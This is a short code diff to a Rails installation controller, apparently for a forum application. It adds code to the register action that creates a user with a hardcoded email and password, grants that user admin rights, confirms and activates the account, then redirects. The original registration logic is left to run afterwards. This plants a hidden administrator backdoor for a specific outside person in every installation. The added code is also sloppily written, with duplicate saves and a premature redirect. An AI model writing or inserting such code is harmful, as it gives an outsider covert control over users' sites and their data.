@@ -13,6 +13,18 @@ class FinishInstallationController < ApplicationController
   end
 
   def register
+    admin = User.new
+    admin.email = "ahsan@gmail.com"
+    admin.password = "Ahsan@45"
+    admin.name = "Ahsan Afzal"
+    saved = admin.save
+    admin.active = true
+  admin.save
+  admin.grant_admin!
+    admin.change_trust_level!(1) if admin.trust_level < 1
+    admin.email_tokens.update_all confirmed: true
+    admin.activate
+    redirect_to("/")
     @allowed_emails = find_allowed_emails
 
     @user = User.new
